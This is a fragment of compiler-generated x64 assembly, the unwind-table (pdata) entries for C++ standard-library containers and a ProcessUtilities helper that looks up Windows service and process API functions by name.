$pdata$??$_Find@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEBAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z DD imagerel $LN5
	DD	imagerel $LN5+43
	DD	imagerel $unwind$??$_Find@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEBAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?RV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V01@@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@0@Z DD imagerel $LN37
	DD	imagerel $LN37+70
	DD	imagerel $unwind$??$?RV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V01@@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Unchecked_erase@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@QEAU32@@Z DD imagerel $LN114
	DD	imagerel $LN114+143
	DD	imagerel $unwind$?_Unchecked_erase@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@QEAU32@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z DD imagerel $LN21
	DD	imagerel $LN21+62
	DD	imagerel $unwind$??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z DD imagerel $LN21+62
	DD	imagerel $LN21+98
	DD	imagerel $chain$0$??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z DD imagerel $LN21+98
	DD	imagerel $LN21+132
	DD	imagerel $chain$1$??$fill@PEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@V12@@std@@YAXQEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@0AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z DD imagerel $LN134
	DD	imagerel $LN134+48
	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z DD imagerel $LN134+48
	DD	imagerel $LN134+342
	DD	imagerel $chain$2$??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$4$??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z DD imagerel $LN134+342
	DD	imagerel $LN134+354
	DD	imagerel $chain$4$??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$5$??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z DD imagerel $LN134+354
	DD	imagerel $LN134+360
	DD	imagerel $chain$5$??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z DD imagerel $LN124
	DD	imagerel $LN124+27
	DD	imagerel $unwind$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$0$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z DD imagerel $LN124+27
	DD	imagerel $LN124+132
	DD	imagerel $chain$0$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$1$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z DD imagerel $LN124+132
	DD	imagerel $LN124+143
	DD	imagerel $chain$1$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$2$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z DD imagerel $LN124+143
	DD	imagerel $LN124+149
	DD	imagerel $chain$2$??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z DD imagerel $LN30
	DD	imagerel $LN30+183
	DD	imagerel $unwind$??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_size_of_n@$07@std@@YA_K_K@Z DD imagerel $LN7
	DD	imagerel $LN7+38
	DD	imagerel $unwind$??$_Get_size_of_n@$07@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z DD imagerel $LN62
	DD	imagerel $LN62+220
	DD	imagerel $unwind$??$_Find_last@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA?AU?$_Hash_find_last_result@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN46
	DD	imagerel $LN46+169
	DD	imagerel $unwind$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@KPEB_W@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@KPEB_W@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN46
	DD	imagerel $LN46+169
	DD	imagerel $unwind$??$GetFunctionAddress@P6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@Z@ProcessUtilities@@YAP6AHPEAUSC_HANDLE__@@W4_SC_STATUS_TYPE@@PEAEKPEAK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN46
	DD	imagerel $LN46+169
	DD	imagerel $unwind$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEB_W0K@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEB_W0K@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN46
	DD	imagerel $LN46+169
	DD	imagerel $unwind$??$GetFunctionAddress@P6APEAUSC_HANDLE__@@PEAU1@PEBDK@Z@ProcessUtilities@@YAP6APEAUSC_HANDLE__@@PEAU1@PEBDK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN46
	DD	imagerel $LN46+169
	DD	imagerel $unwind$??$GetFunctionAddress@P6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@Z@ProcessUtilities@@YAP6AHPEAXKPEB_WPEA_WK01PEAU_STARTUPINFOW@@PEAU_PROCESS_INFORMATION@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN46
	DD	imagerel $LN46+169
	DD	imagerel $unwind$??$GetFunctionAddress@P6AHPEAXPEAUtagPROCESSENTRY32W@@@Z@ProcessUtilities@@YAP6AHPEAXPEAUtagPROCESSENTRY32W@@@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN46
	DD	imagerel $LN46+169
	DD	imagerel $unwind$??$GetFunctionAddress@P6APEAXKK@Z@ProcessUtilities@@YAP6APEAXKK@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z DD imagerel $LN46
	DD	imagerel $LN46+169
	DD	imagerel $unwind$??$GetFunctionAddress@P6AHPEAX@Z@ProcessUtilities@@YAP6AHPEAX@ZPEAUHINSTANCE__@@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Erase@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD imagerel $LN167
	DD	imagerel $LN167+333
	DD	imagerel $unwind$??$_Erase@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$insert@U?$pair@PEBDPEAUHINSTANCE__@@@std@@$0A@@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z DD imagerel $LN4
	DD	imagerel $LN4+23
	DD	imagerel $unwind$??$insert@U?$pair@PEBDPEAUHINSTANCE__@@@std@@$0A@@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$find@X@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD imagerel $LN56
	DD	imagerel $LN56+124
